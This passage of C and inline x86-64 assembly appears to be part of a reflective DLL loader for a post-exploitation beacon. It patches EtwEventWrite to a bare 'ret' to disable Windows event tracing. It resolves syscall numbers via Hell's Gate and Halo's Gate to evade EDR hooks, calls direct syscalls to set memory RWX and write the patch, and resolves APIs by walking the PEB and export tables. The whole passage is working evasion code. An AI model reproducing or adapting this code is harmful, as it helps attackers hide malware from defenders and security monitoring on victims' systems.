    char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    void* pEtwEventWrite  = getSymbolAddress(eew, (void*)13, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);

    if (pEtwEventWrite != NULL) {
        unsigned char etwbypass[] = { 0xc3 }; // ret
        Base = pEtwEventWrite;
        Size = sizeof(etwbypass);
        // make memory region RWX
        #ifdef SYSCALLS
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        // write the bypass
        HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
        HellDescent((HANDLE)-1, pEtwEventWrite, etwbypass, sizeof(etwbypass), &bytesWritten);
        // make memory region RX again
        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
        HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
        #else
        pWriteProcessMemory((PVOID)-1, pEtwEventWrite, (PVOID)etwbypass, Size, &bytesWritten);
        #endif
    }

    return;
}
#endif

#ifdef SYSCALLS
DWORD getSyscallNumber(void* functionAddress)
{
    DWORD syscallNumber = (DWORD)(ULONG_PTR)findSyscallNumber(functionAddress);
    if (syscallNumber == 0) {
        DWORD index = 0;
        while (syscallNumber == 0) {
            index++;
            // Check for unhooked Sycall Above the target stub
            syscallNumber = (DWORD)(ULONG_PTR)halosGateUp(functionAddress, (void*)(ULONG_PTR)index);
            if (syscallNumber) {
                syscallNumber = syscallNumber - index;
                break;
            }
            // Check for unhooked Sycall Below the target stub
            syscallNumber = (DWORD)(ULONG_PTR)halosGateDown(functionAddress, (void*)(ULONG_PTR)index);
            if (syscallNumber) {
                syscallNumber = syscallNumber + index;
                break;
            }
        }
    }
    return syscallNumber;
}
#endif

__asm__(
"getRdllBase: \n"
    "call pop \n"                  // Calling the next instruction puts RIP address on the top of our stack
    "pop: \n"
    "pop rcx \n"                   // pop RIP into RCX
"dec1: \n"
    "xor rbx, rbx \n"               // Clear out RBX - were gonna use it for comparing if we are at start
    "mov ebx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
"dec2: \n"
    "dec rcx \n"
    "cmp bx, word ptr ds:[rcx] \n" // Compare the first 2 bytes of the page to "MZ"
    "jne dec2 \n"            
    "xor rax, rax \n"
    "mov ax, [rcx+0x3C] \n"        // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
    "add rax, rcx \n"              // DLL base + RVA new exe header = 0x00004550 PE00 Signature
    "xor rbx, rbx \n"
    "add bx, 0x4550 \n"             // PEOO
    "cmp bx, word ptr ds:[rax] \n" // Compare the 4 bytes to PE\0\0
    "jne dec1 \n"            
    "mov rax, rcx \n"              // Return the base address of our reflective DLL
    "ret \n"                       // return initRdllAddr
"getDllBase: \n"
    "xor rax, rax \n"              // 0x0
    "mov rcx, [rcx] \n"            // First 8 bytes of string 
"getMemList: \n"
    "mov rbx, gs:[rax+0x60] \n"    // ProcessEnvironmentBlock // GS = TEB
    "mov rbx, [rbx+0x18] \n"       // _PEB_LDR_DATA
    "mov rbx, [rbx+0x20] \n"       // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov r11, rbx \n" 
"crawl: \n"
    "mov rax, [rbx+0x50] \n"       // BaseDllName Buffer
    "mov rax, [rax] \n"            // First 4 Unicode bytes of the DLL string from the Ldr List
    "cmp rax, rcx \n"
    "je found \n"
    "mov rbx, [rbx] \n"            // InMemoryOrderLinks Next Entry
    "cmp r11, [rbx] \n"            // Are we back at the same entry in the list?
    "jne crawl \n"
    "xor rax, rax \n"              // DLL is not in InMemoryOrderModuleList, return NULL
    "jmp end \n"
"found: \n"
    "mov rax, [rbx+0x20] \n"       // DllBase Address in process memory
"end: \n"
    "ret \n"
"getExportDirectory: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rcx, rcx \n"
    "add cx, 0x88 \n"
    "mov eax, [rbx+rcx] \n"
    "add rax, r8 \n"
    "ret \n" // return ExportDirectory;
"getExportAddressTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
    "mov eax, [rdx] \n"        // RVAExportAddressTable (Value/RVA)
    "add rax, rcx \n"          // VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
    "mov eax, [rdx] \n"        // RVAExportAddressOfNames (Value/RVA)
    "add rax, rcx \n"          // VA ExportAddressOfNames 
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
    "mov eax, [rdx] \n"        // RVAExportAddressOfNameOrdinals (Value/RVA)
    "add rax, rcx \n"          // VA ExportAddressOfNameOrdinals 
    "ret \n" // return ExportOrdinalTable;
"getSymbolAddress: \n"
    "mov r10, [RSP+0x28] \n"   // ExportNameTable
    "mov r11, [RSP+0x30] \n"   // ExportOrdinalTable
    "xchg rcx, rdx \n"         // symbolStringSize & RDX =symbolString
    "push rcx \n"              // push str len to stack
    "xor rax, rax \n"
"lFindSym: \n"
    "mov rcx, [rsp] \n"        // DWORD symbolStringSize (Reset string length counter for each loop)
    "xor rdi, rdi \n"          // Clear RDI for setting up string name retrieval
    "mov edi, [r10+rax*4] \n"  // RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add rdi, r8 \n"           // &NameString    = RVA NameString + &module.dll
    "mov rsi, rdx \n"          // Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"            // Compare strings at RDI & RSI
    "je FoundSym \n"           // If match then we found the API string. Now we need to find the Address of the API
    "inc rax \n"               // Increment to check if the next name matches
    "jmp short lFindSym \n"    // Jump back to start of loop
"FoundSym: \n"
    "pop rcx \n"               // Remove string length counter from top of stack
    "mov ax, [r11+rax*2] \n"   // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov eax, [r9+rax*4] \n"   // RVA API = [&AddressTable + API OrdinalNumber]
    "add rax, r8 \n"           // module.<API> = RVA module.<API> + module.dll BaseAddress
    "sub r11, rax \n"          // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
    "jns notForwarder \n"      // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
    "xor rax, rax \n"          // If forwarder, return 0x0 and exit
"notForwarder: \n"
    "ret \n"
"getNewExeHeader: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x3C] \n"   // Offset NewEXEHeader
    "add rax, rcx \n"          // &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x50] \n"   // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov rax, rbx \n"
    "ret \n" // return dllSize;
    "getDllSizeOfHeaders: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rax+0x54] \n"   // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov rax, rbx \n"
    "ret \n" // return SizeOfHeaders;
"copyMemory: \n"
    "dec ecx \n"               // Decrement the counter
    "xor rbx, rbx \n"
    "mov bl, [rdx] \n"        // Load the next byte to write into the BL register
    "mov [r8], bl \n"          // write the byte
    "inc rdx \n"               // move rdx to next byte of source 
    "inc r8 \n"                // move r8 to next byte of destination 
    "test rcx, rcx \n"         // check if rax = 0
    "jne copyMemory \n"        // if rax != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "add rcx, 0x18 \n"
    "xchg rax, rcx \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "add rcx, 0x14 \n"          // &FileHeader.SizeOfOptionalHeader
    "xor rbx, rbx \n"
    "mov bx, [rcx] \n"          // Value of FileHeader.SizeOfOptionalHeader
    "xchg rax, rbx \n"
    "ret \n" 
"add: \n"
    "add rcx, rdx \n"
    "xchg rax, rcx \n"
    "ret \n" 
"getNumberOfSections: \n"
    "add rcx, 0x6 \n"           // &FileHeader.NumberOfSections
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n" 
"getBeaconEntryPoint: \n"
    "add rdx, 0x10 \n"          // OptionalHeader.AddressOfEntryPoint
    "mov eax, [rdx] \n"
    "add rax, rcx \n"           // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
);
#ifdef SYSCALLS
__asm__(
"findSyscallNumber: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"error: \n"
    "xor rax, rax \n"
    "ret \n"
"halosGateUp: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "add rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"halosGateDown: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "sub rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
    "HellsGate: \n"
    "xor r11, r11 \n"
    "mov r11d, ecx \n"
    "ret \n"
"HellDescent: \n"
    "xor rax, rax \n"
    "mov r10, rcx \n"
    "mov eax, r11d \n"
    "syscall \n"
    "ret \n"
);
#endif
